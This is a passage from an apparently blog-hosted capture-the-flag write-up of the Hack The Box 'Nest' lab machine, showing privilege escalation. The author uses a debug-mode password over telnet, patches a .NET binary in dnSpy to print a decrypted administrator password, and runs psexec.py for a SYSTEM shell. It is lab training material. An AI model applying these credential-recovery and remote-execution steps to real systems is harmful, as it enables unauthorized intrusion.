</span></span><span class="line"><span class="cl">$ cat Debug<span class="se">\ </span>Mode<span class="se">\ </span>Password.txt:Password:<span class="se">\$</span>DATA
</span></span><span class="line"><span class="cl">WBQ201953D8w
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="examination-on-hqk-reporting-service-v12">Examination on HQK Reporting Service v1.2</h4>
<p>When visiting <code>http://10.10.10.178:4386/</code>, the browser return a session timeout with <code>&gt;</code> symbol, this can imply that this service is cli-based</p>
<p>With <code>telnet</code>, I can access this service.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «c.smith» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ telnet 10.10.10.178 <span class="m">4386</span>
</span></span></code></pre></div><img src="imgs/image-20210416083748311.png" alt="image-20210416083748311" style="zoom: 80%;" />
<p>The service has debug mode and enabling it shows more commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&gt;debug WBQ201953D8w
</span></span></code></pre></div><img src="imgs/image-20210416083637321.png" alt="image-20210416083637321" style="zoom: 80%;" />
<p>Took me a minute to understand the commands, so basically:</p>
<ul>
<li>LIST is to list directory,</li>
<li>SHOWQUERY is to show file content,</li>
<li>RUNQUERY is to execute.</li>
<li>SETDIR is change directory.</li>
</ul>
<p>Looking up into the LDAP directory, there&rsquo;s <code>ldap.conf</code> that contains administrator credentials with another encrypted password.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*0FINadW8yhptF6wzvidgsw.png" alt="img"  /></div>
</p>
<p>I have a copy of <code>HqkLdap.exe</code> from the previous loot on <code>c.smith</code>&rsquo;s directory, and I will copy that from Kali to my Windows to inspect it. I will also create a copy of the <code>Ldap.conf</code> file.</p>
<h4 id="reversing-hqkldapexe">Reversing HqkLdap.exe</h4>
<p>Running <code>strings HqkLdap.exe</code> against the app reveals that it was built with.NET.</p>
<img src="imgs/image-20210416085451866.png" alt="image-20210416085451866" style="zoom:80%;" />
<p>There is a very useful tool for reversing and debugging .NET applications called <code>dnSpy</code>. It&rsquo;s free on <a href="https://github.com/0xd4d/dnSpy/releases">Github</a>.</p>
<p>I will open  <code>HqkLdap.exe</code> on <code>dnSpy</code> and go straight to the application main function.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*W6q1GITk1OTtrEmoVEX98A.png" alt="img"  /></div>
</p>
<p>To run this program properly, a config file, which is <code>ldap.conf</code>, must be supplied as an argument to the application, and it also needs the existence of <code>HqkDbImport.exe</code> (These two files must be placed in the same folder with <code>HqkLdap.exe</code>).</p>
<img src="imgs/image-20210416091107297.png" alt="image-20210416091107297" style="zoom:80%;" />
<p>So if I run it and I don&rsquo;t pass the check, it will complain like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi<span class="se">\D</span>esktop&gt;.<span class="se">\H</span>qkLdap.exe Ldap.conf
</span></span><span class="line"><span class="cl">Please ensure the optional database import module is installed
</span></span></code></pre></div><p>Next, I look at the decrypt function, which is called on the main when the check is passed.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DoxZojo9U_5FVmtJBydPsg.png" alt="img"  /></div>
</p>
<p>On the next block, I see <code>ldapSearchSettings.Password</code> is assigned to <code>ldap.Password</code></p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*B-sjrlUthEkQ0d6o855QMw.png" alt="img"  /></div>
</p>
<h4 id="exploitation">Exploitation</h4>
<p>To exploit this <code>HqkLdap.exe</code>, I will:</p>
<ul>
<li>Remove the part of codes that used to check for the existence of <code>HqkDbImport.exe</code></li>
<li>Add another line to print out the password from <code>ldap.Password</code>.</li>
</ul>
<p>I&rsquo;ll use the edit feature to edit the main class.</p>
<img src="imgs/image-20210416093818613.png" alt="image-20210416093818613" style="zoom:80%;" />
<p>Also, I’ll get rid of the line that is used to check the existence of <code>HqkDbImport.exe</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">checked</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">try</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line arguments&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">[</span><span class="m">0</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Specified config file does not exist&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]</span> <span class="p">...</span>
</span></span></code></pre></div><p>Then I’ll add a new line code on the main function at line 56 to print <code>ldap.Password</code> to the console.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*FvxtmqQKLEbY9tECtvRTtw.png" alt="img"  /></div>
</p>
<p>I tried to compile it back but then there was an error about the unassigned local variable &rsquo;enumerator&rsquo;. I deleted the following line and attempted to re-compile the binary, and it worked.</p>
<p><div class="img-container"><img src="imgs/image-20210416094537134.png" alt="image-20210416094537134"  /></div>
</p>
<p>Now I can just run with the <strong>ldap.conf</strong> supplied as its argument, and it pops the password out.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DWT9GjrNNCYs_YpYY1B8Ug.png" alt="img"  /></div>
</p>
<p>The password is: <code>XtH4nkS4Pl4y1nGX</code>.</p>
<h4 id="psexecpy">psexec.py</h4>
<p>These credentials can be used with <code>ps-exec.py</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «c.smith» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
</span></span><span class="line"><span class="cl">Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.178.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file nQyIIpWk.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.178.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service gfCe on 10.10.10.178.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service gfCe.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
